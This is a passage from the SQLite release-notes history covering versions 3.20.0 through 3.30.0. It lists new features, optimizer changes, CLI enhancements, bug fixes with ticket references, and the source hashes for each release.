provide information about the on-disk representation of WITHOUT ROWID tables. Add the sqlite3_drop_modules() interface, allowing applications to disable automatically loaded virtual tables that they do not need. Improvements to the .recover dot-command in the CLI so that it recovers more content from corrupt database files. Enhance the RBU extension to support indexes on expressions. Change the schema parser so that it will error out if any of the type, name, and tbl_name columns of the sqlite_master table have been corrupted and the database connection is not in writable_schema mode. The PRAGMA function_list, PRAGMA module_list, and PRAGMA pragma_list commands are now enabled in all builds by default. Disable them using -DSQLITE_OMIT_INTROSPECTION_PRAGMAS. Add the SQLITE_DBCONFIG_ENABLE_VIEW option for sqlite3_db_config(). Added the TCL Interface config method in order to be able to disable SQLITE_DBCONFIG_ENABLE_VIEW as well as control other sqlite3_db_config() options from TCL. Added the SQLITE_DIRECTONLY flag for application-defined SQL functions to prevent those functions from being used inside triggers and views. The legacy SQLITE_ENABLE_STAT3 compile-time option is now a no-op. Hashes: SQLITE_SOURCE_ID: 2019-10-04 15:03:17 c20a35336432025445f9f7e289d0cc3e4003fb17f45a4ce74c6269c407c6e09f SHA3-256 for sqlite3.c: f04393dd47205a4ee2b98ff737dc51a3fdbcc14c055b88d58f5b27d0672158f5 2019-07-10 (3.29.0) Added the SQLITE_DBCONFIG_DQS_DML and SQLITE_DBCONFIG_DQS_DDL actions to sqlite3_db_config() for activating and deactivating the double-quoted string literal misfeature. Both default to \"on\" for legacy compatibility, but developers are encouraged to turn them \"off\", perhaps using the -DSQLITE_DQS=0 compile-time option. -DSQLITE_DQS=0 is now a recommended compile-time option. Improvements to the query planner: Improved optimization of AND and OR operators when one or the other operand is a constant. Enhancements to the LIKE optimization for cases when the left-hand side column has numeric affinity. Added the \"sqlite_dbdata\" virtual table for extracting raw low-level content from an SQLite database, even a database that is corrupt. Improvements to rounding behavior, so that the results of rounding binary numbers using the round() function are closer to what people who are used to thinking in decimal actually expect. Enhancements to the CLI: Add the \".recover\" command which tries to recover as much content as possible from a corrupt database file. Add the \".filectrl\" command useful for testing. Add the long-standing \".testctrl\" command to the \".help\" menu. Added the \".dbconfig\" command Hashes: SQLITE_SOURCE_ID: 2019-07-10 17:32:03 fc82b73eaac8b36950e527f12c4b5dc1e147e6f4ad2217ae43ad82882a88bfa6 SHA3-256 for sqlite3.c: d9a5daf7697a827f4b2638276ce639fa04e8e8bb5fd3a6b683cfad10f1c81b12 2019-04-16 (3.28.0) Enhanced window functions: Add support the EXCLUDE clause. Add support for window chaining. Add support for GROUPS frames. Add support for \"<expr> PRECEDING\" and \"<expr> FOLLOWING\" boundaries in RANGE frames. Added the new sqlite3_stmt_isexplain(S) interface for determining whether or not a prepared statement is an EXPLAIN. Enhanced VACUUM INTO so that it works for read-only databases. New query optimizations: Enable the LIKE optimization for cases when the ESCAPE keyword is present and PRAGMA case_sensitive_like is on. In queries that are driven by a partial index, avoid unnecessary tests of the constraint named in the WHERE clause of the partial index, since we know that constraint must always be true. Enhancements to the TCL Interface: Added the -returntype option to the function method. Added the new bind_fallback method. Enhancements to the CLI: Added support for bound parameters and the .parameter command. Fix the readfile() function so that it returns an empty BLOB rather than throwing an out-of-memory error when reading an empty file. Fix the writefile() function so that when it creates new directories along the path of a new file, it gives them umask permissions rather than the same permissions as the file. Change --update option in the .archive command so that it skips files that are already in the archive and are unchanged. Add the new --insert option that works like --update used to work. Added the fossildelta.c extension that can create, apply, and deconstruct the Fossil DVCS file delta format that is used by the RBU extension. Added the SQLITE_DBCONFIG_WRITABLE_SCHEMA verb for the sqlite3_db_config() interface, that does the same work as PRAGMA writable_schema without using the SQL parser. Added the sqlite3_value_frombind() API for determining if the argument to an SQL function is from a bound parameter. Security and compatibilities enhancements to fts3_tokenizer(): The fts3_tokenizer() function always returns NULL unless either the legacy application-defined FTS3 tokenizers interface are enabled using the sqlite3_db_config(SQLITE_DBCONFIG_ENABLE_FTS3_TOKENIZER) setting, or unless the first argument to fts3_tokenizer() is a bound parameter. The two-argument version of fts3_tokenizer() accepts a pointer to the tokenizer method object even without the sqlite3_db_config(SQLITE_DBCONFIG_ENABLE_FTS3_TOKENIZER) setting if the second argument is a bound parameter Improved robustness against corrupt database files. Miscellaneous performance enhancements Established a Git mirror of the offical SQLite source tree. The canonical sources for SQLite are maintained using the Fossil DVCS at https://sqlite.org/src. The Git mirror can be seen at https://github.com/sqlite/sqlite. Hashes: SQLITE_SOURCE_ID: 2019-04-16 19:49:53 884b4b7e502b4e991677b53971277adfaf0a04a284f8e483e2553d0f83156b50 SHA3-256 for sqlite3.c: 411efca996b65448d9798eb203d6ebe9627b7161a646f5d00911e2902a57b2e9 2019-02-25 (3.27.2) Fix a bug in the IN operator that was introduced by an attempted optimization in version 3.27.0. Ticket df46dfb631f75694 Fix a bug causing a crash when a window function is misused. Ticket 4feb3159c6bc3f7e33959. Fix various documentation typos Hashes: SQLITE_SOURCE_ID: bd49a8271d650fa89e446b42e513b595a717b9212c91dd384aab871fc1d0f6d7 SHA3-256 for sqlite3.c: 1dbae33bff261f979d0042338f72c9e734b11a80720fb32498bae9150cc576e7 2019-02-08 (3.27.1) Fix a bug in the query optimizer: an adverse interaction between the OR optimization and the optimization that tries to use values read directly from an expression index instead of recomputing the expression. Ticket 4e8e4857d32d401f Hashes: SQLITE_SOURCE_ID: 2019-02-08 13:17:39 0eca3dd3d38b31c92b49ca2d311128b74584714d9e7de895b1a6286ef959a1dd SHA3-256 for sqlite3.c: 11c14992660d5ac713ea8bea48dc5e6123f26bc8d3075fe5585d1a217d090233 2019-02-07 (3.27.0) Added the VACUUM INTO command Issue an SQLITE_WARNING message on the error log if a double-quoted string literal is used. The sqlite3_normalized_sql() interface works on any prepared statement created using sqlite3_prepare_v2() or sqlite3_prepare_v3(). It is no longer necessary to use sqlite3_prepare_v3() with SQLITE_PREPARE_NORMALIZE in order to use sqlite3_normalized_sql(). Added the remove_diacritics=2 option to FTS3 and FTS5. Added the SQLITE_PREPARE_NO_VTAB option to sqlite3_prepare_v3(). Use that option to prevent circular references to shadow tables from causing resource leaks. Enhancements to the sqlite3_deserialize() interface: Add the SQLITE_FCNTL_SIZE_LIMIT file-control for setting an upper bound on the size of the in-memory database created by sqlite3_deserialize. The default upper bound is 1GiB, or whatever alternative value is specified by sqlite3_config(SQLITE_CONFIG_MEMDB_MAXSIZE) and/or SQLITE_MEMDB_DEFAULT_MAXSIZE. Honor the SQLITE_DESERIALIZE_READONLY flag, which was previously described in the documentation, but was previously a no-op. Enhance the \"deserialize\" command of the TCL Interface to give it new \"--maxsize N\" and \"--readonly BOOLEAN\" options. Enhancements to the CLI, mostly to support testing and debugging of the SQLite library itself: Add support for \".open --hexdb\". The \"dbtotxt\" utility program used to generate the text for the \"hexdb\" is added to the source tree. Add support for the \"--maxsize N\" option on \".open --deserialize\". Add the \"--memtrace\" command-line option, to show all memory allocations and deallocations. Add the \".eqp trace\" option on builds with SQLITE_DEBUG, to enable bytecode program listing with indentation and PRAGMA vdbe_trace all in one step. Add the \".progress\" command for accessing the sqlite3_progress_handler() interface. Add the \"--async\" option to the \".backup\" command. Add options \"--expanded\", \"--normalized\", \"--plain\", \"--profile\", \"--row\", \"--stmt\", and \"--close\" to the \".trace\" command. Increased robustness against malicious SQL that is run against a maliciously corrupted database. Bug fixes: Do not use a partial index to do a table scan on an IN operator. Ticket 1d958d90596593a774. Fix the query flattener so that it works on queries that contain subqueries that use window functions. Ticket 709fcd17810f65f717 Ensure that ALTER TABLE modifies table and column names embedded in WITH clauses that are part of views and triggers. Fix a parser bug that prevented the use of parentheses around table-valued functions. Fix a problem with the OR optimization on indexes on expressions. Ticket d96eba87698a428c1d. Fix a problem with the LEFT JOIN strength reduction optimization in which the optimization was being applied inappropriately due to an IS NOT NULL operator. Ticket 5948e09b8c415bc45d. Fix the REPLACE command so that it is no longer able to sneak a NULL value into a NOT NULL column even if the NOT NULL column has a default value of NULL. Ticket e6f1f2e34dceeb1ed6 Fix a problem with the use of window functions used within correlated subqueries. Ticket d0866b26f83e9c55e3 Fix the ALTER TABLE RENAME COLUMN command so that it works for tables that have redundant UNIQUE constraints. Ticket bc8d94f0fbd633fd9a Fix a bug that caused zeroblob values to be truncated when inserted into a table that uses an expression index. Ticket bb4bdb9f7f654b0bb9 Hashes: SQLITE_SOURCE_ID: \"2019-02-07 17:02:52 97744701c3bd414e6c9d7182639d8c2ce7cf124c4fce625071ae65658ac61713 \" SHA3-256 for sqlite3.c: ca011a10ee8515b33e5643444b98ee3d74dc45d3ac766c3700320def52bc6aba 2018-12-01 (3.26.0) Optimization: When doing an UPDATE on a table with indexes on expressions, do not update the expression indexes if they do not refer to any of the columns of the table being updated. Allow the xBestIndex() method of virtual table implementations to return SQLITE_CONSTRAINT to indicate that the proposed query plan is unusable and should not be given further consideration. Added the SQLITE_DBCONFIG_DEFENSIVE option which disables the ability to create corrupt database files using ordinary SQL. Added support for read-only shadow tables when the SQLITE_DBCONFIG_DEFENSIVE option is enabled. Added the PRAGMA legacy_alter_table command, which if enabled causes the ALTER TABLE command to behave like older version of SQLite (prior to version 3.25.0) for compatibility. Added PRAGMA table_xinfo that works just like PRAGMA table_info except that it also shows hidden columns in virtual tables. Added the explain virtual table as a run-time loadable extension. Add a limit counter to the query planner to prevent excessive sqlite3_prepare() times for certain pathological SQL inputs. Added support for the sqlite3_normalized_sql() interface, when compiling with SQLITE_ENABLE_NORMALIZE. Enhanced triggers so that they can use table-valued functions that exist in schemas other than the schema where the trigger is defined. Enhancements to the CLI: Improvements to the \".help\" command. The SQLITE_HISTORY environment variable, if it exists, specifies the name of the command-line editing history file The --deserialize option associated with opening a new database cause the database file to be read into memory and accessed using the sqlite3_deserialize() API. This simplifies running tests on a database without modifying the file on disk. Enhancements to the geopoly extension: Always stores polygons using the binary format, which is faster and uses less space. Added the geopoly_regular() function. Added the geopoly_ccw() function. Enhancements to the session extension: Added the SQLITE_CHANGESETAPPLY_INVERT flag Added the sqlite3changeset_start_v2() interface and the SQLITE_CHANGESETSTART_INVERT flag. Added the changesetfuzz.c test-case generator utility. Hashes: SQLITE_SOURCE_ID: \"2018-12-01 12:34:55 bf8c1b2b7a5960c282e543b9c293686dccff272512d08865f4600fb58238b4f9\" SHA3-256 for sqlite3.c: 72c08830da9b5d1cb397c612c0e870d7f5eb41a323b41aa3d8aa5ae9ccedb2c4 2018-11-05 (3.25.3) Disallow the use of window functions in the recursive part of a CTE. Ticket e8275b415a2f03bee Fix the behavior of typeof() and length() on virtual tables. Ticket 69d642332d25aa3b7315a6d385 Strengthen defenses against deliberately corrupted database files. Fix a problem in the query planner that results when a row-value expression is used with a PRIMARY KEY with redundant columns. Ticket 1a84668dcfdebaf12415d Fix the query planner so that it works correctly for IS NOT NULL operators in the ON clause of a LEFT JOIN with the SQLITE_ENABLE_STAT4 compile-time option. 65eb38f6e46de8c75e188a17ec Hashes: SQLITE_SOURCE_ID: \"2018-11-05 20:37:38 89e099fbe5e13c33e683bef07361231ca525b88f7907be7092058007b75036f2\" SHA3-256 for sqlite3.c: 45586e4df74de3a43f3a1f8c7a78c3c3f02edce01af7d10cafe68bb94476a5c5 2018-09-25 (3.25.2) Add the PRAGMA legacy_alter_table=ON command that causes the \"ALTER TABLE RENAME\" command to behave as it did in SQLite versions 3.24.0 and earlier: references to the renamed table inside the bodies of triggers and views are not updated. This new pragma provides a compatibility work around for older programs that expected the older, wonky behavior of ALTER TABLE RENAME. Fix a problem with the new window functions implementation that caused a malfunction when complicated expressions involving window functions were used inside of a view. Fixes for various other compiler warnings and minor problems associated with obscure configurations. Hashes: SQLITE_SOURCE_ID: \"2018-09-25 19:08:10 fb90e7189ae6d62e77ba3a308ca5d683f90bbe633cf681865365b8e92792d1c7\" SHA3-256 for sqlite3.c: 34c23ff91631ae10354f8c9d62fd7d65732b3d7f3acfd0bbae31ff4a62fe28af 2018-09-18 (3.25.1) Extra sanity checking added to ALTER TABLE in the 3.25.0 release sometimes raises a false-positive when the table being modified has a trigger that updates a virtual table. The false-positive caused the ALTER TABLE to rollback, thus leaving the schema unchanged. Ticket b41031ea2b537237. The fix in the 3.25.0 release for the endless-loop in the byte-code associated with the ORDER BY LIMIT optimization did not work for some queries involving window functions. An additional correction is required. Ticket 510cde277783b5fb Hashes: SQLITE_SOURCE_ID: \"2018-09-18 20:20:44 2ac9003de44da7dafa3fbb1915ac5725a9275c86bf2f3b7aa19321bf1460b386\" SHA3-256 for sqlite3.c: 1b2302e7a54cc99c84ff699a299f61f069a28e1ed090b89e4430ca80ae2aab06 2018-09-15 (3.25.0) Add support for window functions Enhancements the ALTER TABLE command: Add support for renaming columns within a table using ALTER TABLE table RENAME COLUMN oldname TO newname. Fix table rename feature so that it also updates references to the renamed table in triggers and views. Query optimizer improvements: Avoid unnecessary loads of columns in an aggregate query that are not within an aggregate function and that are not part of the GROUP BY clause. The IN-early-out optimization: When doing a look-up on a multi-column index and an IN operator is used on a column other than the left-most column, then if no rows match against the first IN value, check to make sure there exist rows that match the columns to the right before continuing with the next IN value. Use the transitive property to try to propagate constant values within the WHERE clause. For example, convert \"a=99 AND b=a\" into \"a=99 AND b=99\". Use a separate mutex on every inode in the unix VFS, rather than a single mutex shared among them all, for slightly better concurrency in multi-threaded environments. Enhance the PRAGMA integrity_check command for improved detection of problems on the page freelist. Output infinity as 1e999 in the \".dump\" command of the command-line shell. Added the SQLITE_FCNTL_DATA_VERSION file-control. Added the Geopoly module Bug fixes: The ORDER BY LIMIT optimization might have caused an infinite loop in the byte code of the prepared statement under very obscure circumstances, due to a confluence of minor defects in the query optimizer. Fix for ticket 9936b2fa443fec03ff25 On an UPSERT when the order of constraint checks is rearranged, ensure that the affinity transformations on the inserted content occur before any of the constraint checks. Fix for ticket 79cad5e4b2e219dd197242e9e. Avoid using a prepared statement for \".stats on\" command of the CLI after it has been closed by the \".eqp full\" logicc. Fix for ticket 7be932dfa60a8a6b3b26bcf76. The LIKE optimization was generating incorrect byte-code and hence getting the wrong answer if the left-hand operand has numeric affinity and the right-hand-side pattern is '/%' or if the pattern begins with the ESCAPE character. Fix for ticket c94369cae9b561b1f996d0054b Hashes: SQLITE_SOURCE_ID: \"2018-09-15 04:01:47 b63af6c3bd33152742648d5d2e8dc5d5fcbcdd27df409272b6aea00a6f761760\" SHA3-256 for sqlite3.c: 989e3ff37f2b5eea8e42205f808ccf0ba86c6ea6aa928ad2c011f33a108ac45d 2018-06-04 (3.24.0) Add support for PostgreSQL-style UPSERT. Add support for auxiliary columns in r-tree tables. Add C-language APIs for discovering SQL keywords used by SQLite: sqlite3_keyword_count(), sqlite3_keyword_name(), and sqlite3_keyword_check(). Add C-language APIs for dynamic strings based on the sqlite3_str object. Enhance ALTER TABLE so that it recognizes \"true\" and \"false\" as valid arguments to DEFAULT. Add the sorter-reference optimization as a compile-time option. Only available if compiled with SQLITE_ENABLE_SORTER_REFERENCES. Improve the format of the EXPLAIN QUERY PLAN raw output, so that it gives better information about the query plan and about the relationships between the various components of the plan. Added the SQLITE_DBCONFIG_RESET_DATABASE option to the sqlite3_db_config() API. CLI Enhancements: Automatically intercepts the raw EXPLAIN QUERY PLAN output and reformats it into an ASCII-art graph. Lines that begin with \"#\" and that are not in the middle of an SQL statement are interpreted as comments. Added the --append option to the \".backup\" command. Added the \".dbconfig\" command. Performance: UPDATE avoids unnecessary low-level disk writes when the contents of the database file do not actually change. For example, \"UPDATE t1 SET x=25 WHERE y=?\" generates no extra disk I/O if the value in column x is already 25. Similarly, when doing UPDATE on records that span multiple pages, only the subset of pages that actually change are written to disk. This is a low-level performance optimization only and does not affect the behavior of TRIGGERs or other higher level SQL structures. Queries that use ORDER BY and LIMIT now try to avoid computing rows that cannot possibly come in under the LIMIT. This can greatly improve performance of ORDER BY LIMIT queries, especially when the LIMIT is small relative to the number of unrestricted output rows. The OR optimization is allowed to proceed even if the OR expression has also been converted into an IN expression. Uses of the OR optimization are now also more clearly shown in the EXPLAIN QUERY PLAN output. The query planner is more aggressive about using automatic indexes for views and subqueries for which it is not possible to create a persistent index. Make use of the one-pass UPDATE and DELETE query plans in the R-Tree extension where appropriate. Performance improvements in the LEMON-generated parser. Bug fixes: For the right-hand table of a LEFT JOIN, compute the values of expressions directly rather than loading precomputed values out of an expression index as the expression index might not contain the correct value. Ticket 7fa8049685b50b5aeb0c2 Do not attempt to use terms from the WHERE clause to enable indexed lookup of the right-hand table of a LEFT JOIN. Ticket 4ba5abf65c5b0f9a96a7a Fix a memory leak that can occur following a failure to open error in the CSV virtual table Fix a long-standing problem wherein a corrupt schema on the sqlite_sequence table used by AUTOINCREMENT can lead to a crash. Ticket d8dc2b3a58cd5dc2918a1 Fix the json_each() function so that it returns valid results on its \"fullkey\" column when the input is a simple value rather than an array or object. Hashes: SQLITE_SOURCE_ID: \"2018-06-04 19:24:41 c7ee0833225bfd8c5ec2f9bf62b97c4e04d03bd9566366d5221ac8fb199a87ca\" SHA3-256 for sqlite3.c: 0d384704e1c66026228336d1e91771d295bf688c9c44c7a44f25a4c16c26ab3c 2018-04-10 (3.23.1) Fix two problems in the new LEFT JOIN strength reduction optimization. Tickets 1e39b966ae9ee739 and fac496b61722daf2. Fix misbehavior of the FTS5 xBestIndex method. Ticket 2b8aed9f7c9e61e8. Fix a harmless reference to an uninitialized virtual machine register. Ticket 093420fc0eb7cba7. Fix the CLI so that it builds with -DSQLITE_UNTESTABLE Fix the eval.c extension so that it works with PRAGMA empty_result_callbacks=ON. Fix the generate_series virtual table so that it correctly returns no rows if any of its constraints are NULL. Performance enhancements in the parser. Hashes: SQLITE_SOURCE_ID: \"2018-04-10 17:39:29 4bb2294022060e61de7da5c227a69ccd846ba330e31626ebcd59a94efd148b3b\" SHA3-256 for sqlite3.c: 65750d1e506f416a0b0b9dd22d171379679c733e3460549754dc68c92705b5dc 2018-04-02 (3.23.0) Add the sqlite3_serialize() and sqlite3_deserialize() interfaces when the SQLITE_ENABLE_DESERIALIZE compile-time option is used. Recognize TRUE and FALSE as constants. (For compatibility, if there exist columns named \"true\" or \"false\", then the identifiers refer to the columns rather than Boolean constants.) Support operators IS TRUE, IS FALSE, IS NOT TRUE, and IS NOT FALSE. Added the SQLITE_DBSTATUS_CACHE_SPILL option to sqlite3_db_status() for reporting the number of cache spills that have occurred. The \"alternate-form-2\" flag (\"!\") on the built-in printf implementation now causes string substitutions to measure the width and precision in characters instead of bytes. If the xColumn method in a virtual table implementation returns an error message using sqlite3_result_error() then give that error message preference over internally-generated messages. Added the -A command-line option to the CLI to make it easier to manage SQLite Archive files. Add support for INSERT OR REPLACE, INSERT OR IGNORE, and UPDATE OR REPLACE in the Zipfile virtual table. Enhance the sqlite3changeset_apply() interface so that it is hardened against attacks from deliberately corrupted changeset objects. Added the sqlite3_normalize() extension function. Query optimizer enhancements: Improve the omit-left-join optimization so that it works in cases where the right-hand table is UNIQUE but not necessarily NOT NULL. Improve the push-down optimization so that it works for many LEFT JOINs. Add the LEFT JOIN strength reduction optimization that converts a LEFT JOIN into an ordinary JOIN if there exist terms in the WHERE clause that would prevent the extra all-NULL row of the LEFT JOIN from appearing in the output set. Avoid unnecessary writes to the sqlite_sequence table when an AUTOINCREMENT table is updated with an rowid that is less than the maximum. Bug fixes: Fix the parser to accept valid row value syntax. Ticket 7310e2fb3d046a5 Fix the query planner so that it takes into account dependencies in the arguments to table-valued functions in subexpressions in the WHERE clause. Ticket 80177f0c226ff54 Fix incorrect result with complex OR-connected WHERE and STAT4. Ticket ec32177c99ccac2 Fix potential corruption in indexes on expressions due to automatic datatype conversions. Ticket 343634942dd54ab Assertion fault in FTS4. Ticket d6ec09eccf68cfc Incorrect result on the less-than operator in row values. Ticket f484b65f3d62305 Always interpret non-zero floating-point values as TRUE, even if the integer part is zero. Ticket 36fae083b450e3a Fix an issue in the fsdir(PATH) table-valued function to the fileio.c extension, that caused a segfault if the fsdir() table was used as the inner table of a join. Problem reported on the mailing list and fixed by check-in 7ce4e71c1b7251be Issue an error rather instead of an assertion-fault or null-pointer dereference when the sqlite_master table is corrupted so that the sqlite_sequence table root page is really a btree-index page. Check-in 525deb7a67fbd647 Fix the ANALYZE command so that it computes statistics on tables whose names begin with \"sqlite\". Check-in 0249d9aecf69948d Additional fixes for issues detected by OSSFuzz: Fix a possible infinite loop on VACUUM for corrupt database files. Check-in 27754b74ddf64 Disallow parameters in the WITH clause of triggers and views. Check-in b918d4b4e546d Fix a potential memory leak in row value processing. Check-in 2df6bbf1b8ca8 Improve the performance of the replace() SQL function for cases where there are many substitutions on megabyte-sized strings, in an attempt to avoid OSSFuzz timeouts during testing. Check-in fab2c2b07b5d3 Provide an appropriate error message when the sqlite_master table contains a CREATE TABLE AS statement. Formerly this caused either an assertion fault or null pointer dereference. Problem found by OSSFuzz on the GDAL project. Check-in d75e67654aa96 Incorrect assert() statement removed. Check-in 823779d31eb09cda. Fix a problem with using the LIKE optimization on an INTEGER PRIMARY KEY. Check-in b850dd159918af56. Hashes: SQLITE_SOURCE_ID: \"2018-04-02 11:04:16 736b53f57f70b23172c30880186dce7ad9baa3b74e3838cae5847cffb98f5cd2\" SHA3-256 for sqlite3.c: 4bed3dc2dc905ff55e2c21fd2725551fc0ca50912a9c96c6af712a4289cb24fa 2018-01-22 (3.22.0) The output of sqlite3_trace_v2() now shows each individual SQL statement run within a trigger. Add the ability to read from WAL mode databases even if the application lacks write permission on the database and its containing directory, as long as the -shm and -wal files exist in that directory. Added the rtreecheck() scalar SQL function to the R-Tree extension. Added the sqlite3_vtab_nochange() and sqlite3_value_nochange() interfaces to help virtual table implementations optimize UPDATE operations. Added the sqlite3_vtab_collation() interface. Added support for the \"^\" initial token syntax in FTS5. New extensions: The Zipfile virtual table can read and write a ZIP Archive. Added the fsdir(PATH) table-valued function to the fileio.c extension, for listing the files in a directory. The sqlite_btreeinfo eponymous virtual table for introspecting and estimating the sizes of the btrees in a database. The Append VFS is a VFS shim that allows an SQLite database to be appended to some other file. This allows (for example) a database to be appended to an executable that then opens and reads the database. Query planner enhancements: The optimization that uses an index to quickly compute an aggregate min() or max() is extended to work with indexes on expressions. The decision of whether to implement a FROM-clause subquery as a co-routine or using query flattening now considers whether the result set of the outer query is \"complex\" (if it contains functions or expression subqueries). A complex result set biases the decision toward the use of co-routines. The planner avoids query plans that use indexes with unknown collating functions. The planner omits unused LEFT JOINs even if they are not the right-most joins of a query. Other performance optimizations: A smaller and faster implementation of text to floating-point conversion subroutine: sqlite3AtoF(). The Lemon parser generator creates a faster parser. Use the strcspn() C-library routine to speed up the LIKE and GLOB operators. Improvements to the command-line shell: The \".schema\" command shows the structure of virtual tables. Added support for reading and writing SQLite Archive files using the .archive command. Added the experimental .expert command Added the \".eqp trigger\" variant of the \".eqp\" command Enhance the \".lint fkey-indexes\" command so that it works with WITHOUT ROWID tables. If the filename argument to the shell is a ZIP archive rather than an SQLite database, then the shell automatically opens that ZIP archive using the Zipfile virtual table. Added the edit() SQL function. Added the .excel command to simplify exporting database content to a spreadsheet. Databases are opened using Append VFS when the --append flag is used on the command line or with the .open command. Enhance the SQLITE_ENABLE_UPDATE_DELETE_LIMIT compile-time option so that it works for WITHOUT ROWID tables. Provide the sqlite_offset(X) SQL function that returns the byte offset into the database file to the beginning of the record holding value X, when compiling with -DSQLITE_ENABLE_OFFSET_SQL_FUNC. Bug fixes: Infinite loop on an UPDATE that uses an OR operator in the WHERE clause. Problem introduced with 3.17.0 and reported on the mailing list about one year later. Ticket 47b2581aa9bfecec. Incorrect query results when the skip-ahead-distinct optimization is used. Ticket ef9318757b152e3a. Incorrect query results on a join with a ORDER BY DESC. Ticket 123c9ba32130a6c9. Inconsistent result set column names between CREATE TABLE AS and a simple SELECT. Ticket 3b4450072511e621 Assertion fault when doing REPLACE on an index on an expression. Ticket dc3f932f5a147771 Assertion fault when doing an IN operator on a constant index. Ticket aa98619ad08ddcab Hashes: SQLITE_SOURCE_ID: \"2018-01-22 18:45:57 0c55d179733b46d8d0ba4d88e01a25e10677046ee3da1d5b1581e86726f2171d\" SHA3-256 for sqlite3.c: 206df47ebc49cd1710ac0dd716ce5de5854826536993f4feab7a49d136b85069 2017-10-24 (3.21.0) Take advantage of the atomic-write capabilities in the F2FS filesystem when available, for greatly reduced transaction overhead. This currently requires the SQLITE_ENABLE_BATCH_ATOMIC_WRITE compile-time option. Allow ATTACH and DETACH commands to work inside of a transaction. Allow WITHOUT ROWID virtual tables to be writable if the PRIMARY KEY contains exactly one column. The \"fsync()\" that occurs after the header is written in a WAL reset now uses the sync settings for checkpoints. This means it will use a \"fullfsync\" on macs if PRAGMA checkpoint_fullfsync set on. The sqlite3_sourceid() function tries to detect if the source code has been modified from what is checked into version control and if there are modifications, the last four characters of the version hash are shown as \"alt1\" or \"alt2\". The objective is to detect accidental and/or careless edits. A forger can subvert this feature. Improved de-quoting of column names for CREATE TABLE AS statements with an aggregate query on the right-hand side. Fewer \"stat()\" system calls issued by the unix VFS. Enhanced the LIKE optimization so that it works with an ESCAPE clause. Enhanced PRAGMA integrity_check and PRAGMA quick_check to detect obscure row corruption that they were formerly missing. Also update both pragmas so that they return error text rather than SQLITE_CORRUPT when encountering corruption in records. The query planner now prefers to implement FROM-clause subqueries using co-routines rather using the query flattener optimization. Support for the use of co-routines for subqueries may no longer be disabled. Pass information about !=, IS, IS NOT, NOT NULL, and IS NULL constraints into the xBestIndex method of virtual tables. Enhanced the CSV virtual table so that it accepts the last row of input if the final new-line character is missing. Remove the rarely-used \"scratch\" memory allocator. Replace it with the SQLITE_CONFIG_SMALL_MALLOC configuration setting that gives SQLite a hint that large memory allocations should be avoided when possible. Added the swarm virtual table to the existing union virtual table extension. Added the sqlite_dbpage virtual table for providing direct access to pages of the database file. The source code is built into the amalgamation and is activated using the -DSQLITE_ENABLE_DBPAGE_VTAB compile-time option. Add a new type of fts5vocab virtual table - \"instance\" - that provides direct access to an FTS5 full-text index at the lowest possible level. Remove a call to rand_s() in the Windows VFS since it was causing problems in Firefox on some older laptops. The src/shell.c source code to the command-line shell is no longer under version control. That file is now generated as part of the build process. Miscellaneous microoptimizations reduce CPU usage by about 2.1%. Bug fixes: Fix a faulty assert() statement discovered by OSSFuzz. Ticket cb91bf4290c211d Fix an obscure memory leak in sqlite3_result_pointer(). Ticket 7486aa54b968e9b Avoid a possible use-after-free error by deferring schema resets until after the query planner has finished running. Ticket be436a7f4587ce5 Only use indexes-on-expressions to optimize ORDER BY or GROUP BY if the COLLATE is correct. Ticket e20dd54ab0e4383 Fix an assertion fault that was coming up when the expression in an index-on-expressions is really a constant. Ticket aa98619ad08ddca Fix an assertion fault that could occur following PRAGMA reverse_unordered_selects. Ticket cb91bf4290c211d Fix a segfault that can occur for queries that use table-valued functions in an IN or EXISTS subquery. Ticket b899b6042f97f5 Fix a potential integer overflow problem when compiling a particular horrendous common table expression. This was another problem discovered by OSSFuzz. Check-in 6ee8cb6ae5. Fix a potential out-of-bound read when querying a corrupt database file, a problem detected by Natalie Silvanovich of Google Project Zero. Check-in 04925dee41a21f. Hashes: SQLITE_SOURCE_ID: \"2017-10-24 18:55:49 1a584e499906b5c87ec7d43d4abce641fdf017c42125b083109bc77c4de48827\" SHA3-256 for sqlite3.c: 84c181c0283d0320f488357fc8aab51898370c157601459ebee49d779036fe03 2017-08-24 (3.20.1) Fix a potential memory leak in the new sqlite3_result_pointer() interface. Ticket 7486aa54b968e9b5. Hashes: SQLITE_SOURCE_ID: \"2017-08-24 16:21:36 8d3a7ea6c5690d6b7c3767558f4f01b511c55463e3f9e64506801fe9b74dce34\" SHA3-256 for sqlite3.c: 93b1a6d69b48dc39697d1d3a1e4c30b55da0bdd2cad0c054462f91081832954a 2017-08-01 (3.20.0) Update the text of error messages returned by sqlite3_errmsg() for some error codes. Add new pointer passing interfaces. Backwards-incompatible changes to some extensions in order to take advantage of the improved security offered by the new pointer passing interfaces: Extending FTS5 requires sqlite3_bind_pointer() to find the fts5_api pointer. carray(PTR,N) requires sqlite3_bind_pointer() to set the PTR parameter. remember(V,PTR) requires sqlite3_bind_pointer() to set the PTR parameter. Added the SQLITE_STMT virtual table extension. Added the COMPLETION extension - designed to suggest tab-completions for interactive user interfaces. This is a work in progress. Expect further enhancements in future releases. Added the UNION virtual table extension. The built-in date and time functions have been enhanced so that they can be used in CHECK constraints, in indexes on expressions, and in the WHERE clauses of partial indexes, provided that they do not use the 'now', 'localtime', or 'utc' keywords. More information. Added the sqlite3_prepare_v3() and sqlite3_prepare16_v3() interfaces with the extra \"prepFlags\" parameters. Provide the SQLITE_PREPARE_PERSISTENT flag for sqlite3_prepare_v3() and use it to limit lookaside memory misuse by FTS3, FTS5, and the R-Tree extension. Added the PRAGMA secure_delete=FAST command. When secure_delete is set to FAST, old content is overwritten with zeros as long as that does not increase the amount of I/O. Deleted content might still persist on the free-page list but will be purged from all b-tree pages. Enhancements to the command-line shell: Add support for tab-completion using the COMPLETION extension, for both readline and linenoise. Add the \".cd\" command. Enhance the \".schema\" command to show the schema of all attached databases. Enhance \".tables\" so that it shows the schema names for all attached if the name is anything other than \"main\". The \".import\" command ignores an initial UTF-8 BOM. Added the \"--newlines\" option to the \".dump\" command to cause U+000a and U+000d characters to be output literally rather than escaped using the replace() function. Query planner enhancements: When generating individual loops for each ORed term of an OR scan, move any constant WHERE expressions outside of the loop, as is done for top-level loops. The query planner examines the values of bound parameters to help determine if a partial index is usable. When deciding between two plans with the same estimated cost, bias the selection toward the one that does not use the sorter. Evaluate WHERE clause constraints involving correlated subqueries last, in the hope that they never have be evaluated at all. Do not use the flattening optimization for a sub-query on the RHS of a LEFT JOIN if that subquery reads data from a virtual table as doing so prevents the query planner from creating automatic indexes on the results of the sub-query, which can slow down the query. Add SQLITE_STMTSTATUS_REPREPARE, SQLITE_STMTSTATUS_RUN, and 